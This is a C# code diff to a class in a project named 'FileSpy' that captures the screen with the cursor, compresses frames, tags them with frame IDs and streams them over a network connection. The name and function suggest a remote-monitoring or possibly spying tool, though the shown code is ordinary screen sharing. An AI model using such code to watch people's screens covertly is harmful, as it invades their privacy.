@@ -1,5 +1,6 @@
 ﻿using NAudio.Wave;
 using System;
+using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
@@ -20,8 +21,9 @@ namespace FileSpy.Classes
         bool Connected;
         DateTime LastTime;
 
+        UInt64 FrameID = 0;
+
         public bool VideoStream { get; set; }
-        DateTime LastFPS;
         public int MaxFps { get; set; }
         public long Quality { get; set; }
         public int Size { get; set; }
@@ -72,6 +74,7 @@ namespace FileSpy.Classes
 
         private void VideoSender()
         {
+            DateTime LastFPS = DateTime.Now;
             while (Connected)
             {
                 if (VideoStream)
@@ -80,7 +83,9 @@ namespace FileSpy.Classes
                     {
                         LastFPS = DateTime.Now;
 
-                        Task.Run(() => Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor))));
+                        Thread screen = new Thread(() => Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor, FrameID - 1))));
+                        FrameID++;
+                        screen.Start();
 
                         while ((DateTime.Now - LastFPS).TotalMilliseconds < 1000 / MaxFps)
                             Thread.Sleep(1);
@@ -91,6 +96,14 @@ namespace FileSpy.Classes
                 {
                     Thread.Sleep(1);
                 }
+            }
+        }
+
+        private void VideoThread()
+        {
+            while (Connected)
+            {
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor, FrameID - 1)));
             }
         }
 
@@ -157,7 +170,7 @@ namespace FileSpy.Classes
 
         const Int32 CURSOR_SHOWING = 0x00000001;
 
-        public static byte[] TakeImageFrom(int size, long quality, bool cursor)
+        public static byte[] TakeImageFrom(int size, long quality, bool cursor, UInt64 FrameID)
         {
             using (var ms = new MemoryStream())
             {
@@ -208,7 +221,7 @@ namespace FileSpy.Classes
                         //bitmap.Save(ms, ImageFormat.Jpeg);
                         byte[] data = ms.ToArray();
 
-                        return Zipper(data);
+                        return new VideoData(Zipper(data), FrameID).ToArray();
                     }
                 }
             }
